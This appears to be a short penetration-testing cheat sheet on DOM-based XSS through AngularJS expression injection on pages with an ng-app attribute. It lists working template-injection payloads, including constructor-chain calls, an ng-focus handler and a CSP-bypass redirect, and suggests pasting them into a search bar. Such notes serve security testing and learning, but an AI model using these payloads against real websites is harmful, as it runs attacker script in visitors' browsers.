![image1](Image/xss.png)

## DOM XSS in AngularJS expression

- __When HTML contains ng-app attribute__
  - __you can execute arbitrary JavaScript code__
  - __To get the payloads go to book.hacktricks.xyz__
  - __use any payload in the search bar__
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

